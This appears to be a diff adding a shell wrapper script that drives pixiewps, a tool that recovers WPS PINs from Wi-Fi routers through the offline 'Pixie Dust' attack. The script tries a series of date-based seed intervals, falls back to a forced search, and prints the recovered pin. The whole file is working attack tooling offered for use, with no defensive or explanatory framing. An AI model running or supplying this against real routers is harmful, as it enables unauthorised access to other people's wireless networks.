@@ -1,0 +1,72 @@
+#!/bin/sh
+
+# This wrapper to follow the following conventions:
+# 1) arguments are passed precisely as for pixiewps
+# 2) on failure, non-zero exit status is returned
+# 3) on success, exactly one line is printed to stdout,
+#    containing the found pin and a trailing newline character,
+#    in case of null pin, only a newline character '\n' would be returned
+#    and exit status 0 is returned.
+
+# get current year
+yyyy=$(date +%Y)
+
+#get current month and go back 2 months
+mm=`expr $(date +%m) - 2`
+if [ $mm -le 0 ] ; then
+	mm=$(($mm+12))
+	yyyy=$(($yyyy-1))
+fi
+
+# set first start interval
+start=$(printf "%02d/%d" "$mm" "$yyyy")
+
+# advance 3 months
+mm=$(($mm+3))
+if [ $mm -gt 12 ] ; then
+	mm=$(($mm-12))
+	yyyy=$(($yyyy+1))
+fi
+
+# set first end interval
+end=$(printf "%02d/%d" "$mm" "$yyyy")
+
+intervals=$start:$end'
+01/1970:03/1970
+01/2015:03/2015
+01/2000:03/2000
+01/2013:03/2013
+'
+
+# remove all temporary files left over previously with CTRL+C
+tmp=$(ls | egrep ^tmp\.[0-9]+[$]$)
+for i in $tmp ; do
+	rm $i
+done
+
+# run Pixiewps with optimization
+for i in $intervals ; do
+	start=$(printf "%s\n" "$i" | cut -d : -f 1)
+	end=$(printf "%s\n" "$i" | cut -d : -f 2)
+	if pixiewps $@ --start $start --end $end > tmp.$$$ ; then
+		cat tmp.$$$ | grep 'WPS pin:' | cut -d ':' -f 2 | sed 's/^[ ]\+\|<empty>//g'
+		rm tmp.$$$
+		return 0
+	elif cat tmp.$$$ | grep -o 'vulnerable' > /dev/null ; then
+		rm tmp.$$$
+		continue
+	else
+		rm tmp.$$$
+		return 1
+	fi
+done
+
+# run Pixiewps with -f/--force option
+if pixiewps $@ --force > tmp.$$$ ; then
+	cat tmp.$$$ | grep 'WPS pin:' | cut -d ':' -f 2 | sed 's/^[ ]\+\|<empty>//g'
+	rm tmp.$$$
+	return 0
+else
+	rm tmp.$$$
+	return 1
+fi
